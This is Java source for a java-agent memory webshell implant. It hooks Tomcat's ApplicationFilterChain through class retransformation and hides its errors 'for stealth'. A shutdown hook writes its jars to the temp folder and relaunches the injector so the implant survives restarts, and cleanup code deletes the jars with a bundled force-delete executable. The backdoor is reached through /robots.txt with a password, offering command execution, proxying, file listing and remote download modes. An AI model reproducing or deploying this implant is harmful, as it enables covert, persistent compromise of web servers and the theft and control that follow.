package net.sorry.agent;


import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.Query;
import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.Set;

public class reAgent {
    public static String className = "org.apache.catalina.core.ApplicationFilterChain";//类名
    public static byte[] injectFileBytes = new byte[] {};//reInject.jar的字节码
    public static byte[] agentFileBytes = new byte[]{};//reAgent.jar的字节码
    public static String currentPath;//当前路径，用与后面的写文件，删文件等
    public static String password = "re";//

    public static void agentmain(String agentArgs, Instrumentation inst){
        inst.addTransformer(new reTransformer(), true);//确定可以重编译
        if(agentArgs.indexOf("^") >= 0){
            //分离从reInject.jar中传来的参数
            currentPath = agentArgs.split("\\^")[0];
            password = agentArgs.split("\\^")[1];
        }else {
            currentPath = agentArgs;
        }
        System.out.println("Agent Main Done");
        Class[] loadedClasses = inst.getAllLoadedClasses();//获取正在运行的所有类
        for(Class c : loadedClasses){
            if(c.getName().equals(className)){
                try{
                    System.out.println("[+]Message:Found Target Class:      "+c.getName());
                    inst.retransformClasses(c);//启动类的重写加载
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
        try{
            initLoad();//初始化访问
            readInjectFile(currentPath);//读reInject.jar
            readAgentFile(currentPath);//读reAgent.jar
            //clear(reAgent.currentPath);
        }catch (Exception e){
            //为了隐蔽不打印
        }
        persist();//重启前将jar写入temp目录
    }


    //重启前将jar写入临时文件夹
    public static void persist() {
        try {
            Thread t = new Thread() {
                public void run() {
                    try {
                        writeFiles("reInject.jar", injectFileBytes);
                        writeFiles("reAgent.jar", agentFileBytes);
                        startInject();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {

        }
    }

    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();
    }

    public static void readInjectFile(String filePath) throws Exception {
        String fileName = "reInject.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[102400];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "reAgent.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[102400];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void startInject() throws Exception {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "reInject.jar " + reAgent.password;
        Runtime.getRuntime().exec(cmd);
    }

    public static void main(String[] args){
        try{
            readAgentFile("e:/");
            String tempPath = reAttach.class.getProtectionDomain().getCodeSource().getLocation().getPath();

            String agentFile = reAttach.class.getProtectionDomain().getCodeSource().getLocation().getPath().substring(0,
                    tempPath.lastIndexOf("/"));
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] != null) {
                totalLength += byteArray[i].length;
            }
        }

        byte[] result = new byte[totalLength];
        int cur = 0;

        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] != null) {
                System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
                cur += byteArray[i].length;
            }
        }

        return result;
    }

    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = reAgent.currentPath;

            public void run() {
                try {
                    Thread.sleep(5000L);
                    String injectFile = currentPath + "reInject.jar";
                    String agentFile = currentPath + "reAgent.jar";
                    new File(injectFile).getCanonicalFile().delete();
                    String OS = System.getProperty("os.name").toLowerCase();
                    if (OS.indexOf("windows") >= 0) {
                        try {
                            reAgent.unlockFile(currentPath);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    new File(agentFile).delete();
                } catch (Exception e) {
                    //pass
                }
            }
        };
        clearThread.start();

    }

    public static void unlockFile(String currentPath) throws Exception {
        String exePath = currentPath + "foreceDelete.exe";
        System.out.println(exePath+"******************************");
        InputStream is = reAgent.class.getClassLoader().getResourceAsStream("other/forcedelete.exe");
        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
        byte[] bytes = new byte[102400];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            fos.write(bytes, 0, num);
            fos.flush();
        }
        fos.close();
        is.close();
        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        new File(exePath).delete();
    }

    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }

    public static void initLoad() throws Exception {
        try {
            MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
            Set<ObjectName> objectNames = beanServer.queryNames(new ObjectName("*:type=Connector,*"),
                    Query.match(Query.attr("protocol"), Query.value("HTTP/1.1")));
            String host = "127.0.0.1";
            String port = objectNames.iterator().next().getKeyProperty("port");
            String url = "http" + "://" + host + ":" + port;
            String[] models = new String[] { "model=exec&cmd=whoami", "model=proxy", "model=chopper", "model=list&path=.",
                    "model=urldownload&url=https://www.baidu.com/robots.txt&path=not_exist:/not_exist" };
            for (String model : models) {
                //String address = url + "/robots.txt?" + "pass_the_world=" + reAgent.password + "&" + model;
                String address = url + "/robots.txt?" + "re=" + reAgent.password + "&" + model;
                openUrl(address);
            }
        }
        catch(Exception e)
        {
            //pass
        }
    }

    public static void openUrl(String address) throws Exception {
        URL url = new URL(address);
        HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
        urlcon.connect(); // 获取连接
        InputStream is = urlcon.getInputStream();
        BufferedReader buffer = new BufferedReader(new InputStreamReader(is));
        StringBuffer bs = new StringBuffer();
        String l = null;
        while ((l = buffer.readLine()) != null) {
            bs.append(l).append("\n");
        }
    }
}
